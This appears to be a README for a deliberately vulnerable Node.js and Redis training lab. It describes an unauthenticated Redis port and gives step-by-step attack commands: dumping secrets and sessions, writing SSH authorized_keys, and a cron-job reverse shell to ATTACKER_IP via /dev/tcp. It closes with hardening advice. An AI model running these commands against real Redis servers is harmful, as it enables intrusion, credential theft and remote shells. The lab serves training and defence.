# Lab 19 — Unauthenticated Redis Exposure 🔴🔴

**Port:** `8019` (API) + **`6399`** (Redis directly exposed!)  
**Stack:** Node.js + Redis  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

1. **Redis Exposed on Public Port Without Auth** — `6399:6379` mapped with no `requirepass`
2. **Sensitive Secrets Stored in Redis** — `admin_password`, `jwt_secret`, `stripe_secret_key`, session tokens
3. **No Encryption** — All data transmitted in plaintext
4. **CONFIG Command Enabled** — Allows writing files to disk → RCE (cron, SSH authorized_keys)

---

## 🎯 Attack Scenarios

### Scenario A — Direct Redis Connection & Data Dump
```bash
docker compose up -d

# Connect directly to exposed Redis (no password!)
redis-cli -h localhost -p 6399

# Inside redis-cli:
PING                          # Should return PONG
KEYS *                        # List all keys
GET admin_password            # Get admin password
GET jwt_secret                # Get JWT signing secret
GET api_master_key            # Get master API key
GET stripe_secret_key         # Get payment key
GET flag                      # Capture the flag!
HGETALL user:1                # Get full user record
GET session:abc123            # Steal admin session
```

### Scenario B — Automated Dump with redis-cli
```bash
# Dump all keys and values
redis-cli -h localhost -p 6399 --scan | while read key; do
  echo "=== $key ==="
  redis-cli -h localhost -p 6399 GET "$key" 2>/dev/null || \
  redis-cli -h localhost -p 6399 HGETALL "$key" 2>/dev/null || \
  redis-cli -h localhost -p 6399 LRANGE "$key" 0 -1 2>/dev/null
done
```

### Scenario C — RCE via CONFIG (Write SSH Authorized Keys)
```bash
# If Redis process has write access to /root/.ssh
redis-cli -h localhost -p 6399 CONFIG SET dir /root/.ssh
redis-cli -h localhost -p 6399 CONFIG SET dbfilename authorized_keys
redis-cli -h localhost -p 6399 SET pwn "\n\nssh-rsa AAAA...YOUR_PUBLIC_KEY... attacker\n\n"
redis-cli -h localhost -p 6399 BGSAVE
# Now SSH in as root!
```

### Scenario D — RCE via Cron Job (Linux)
```bash
redis-cli -h localhost -p 6399 CONFIG SET dir /var/spool/cron/
redis-cli -h localhost -p 6399 CONFIG SET dbfilename root
redis-cli -h localhost -p 6399 SET cron "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
redis-cli -h localhost -p 6399 BGSAVE
```

### Scenario E — Nmap Discovery
```bash
# Discover Redis on network scan
nmap -p 6379,6380,6399 --script redis-info localhost

# Check if auth is required
nmap -p 6399 --script redis-brute localhost
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `redis-cli` | Direct connection: `redis-cli -h localhost -p 6399` |
| `nmap` | `nmap --script redis-info -p 6399 localhost` |
| `redis-rogue-server` | RCE via replication abuse |
| Metasploit | `use auxiliary/scanner/redis/redis_server` |

---

## 🔐 How to Fix

```yaml
# redis.conf
requirepass YourStrongRandomPassword123!
bind 127.0.0.1          # Only bind to localhost
protected-mode yes
rename-command CONFIG ""        # Disable CONFIG command
rename-command FLUSHALL ""     # Disable dangerous commands
rename-command KEYS ""         # Use SCAN instead
rename-command DEBUG ""

# TLS (Redis 6+)
tls-port 6380
tls-cert-file /etc/redis/tls/redis.crt
tls-key-file /etc/redis/tls/redis.key
```

```yaml
# docker-compose.yml — NEVER expose Redis port to host in production
services:
  redis:
    image: redis:7-alpine
    command: redis-server --requirepass ${REDIS_PASSWORD}
    # NO ports: section — only accessible within Docker network
    networks: [internal]
```

**Key principles:**
- Redis should NEVER be exposed to public internet
- Always require authentication (`requirepass`)
- Bind to localhost or internal network only
- Never store plaintext secrets in Redis — use encrypted vault (HashiCorp Vault, AWS Secrets Manager)
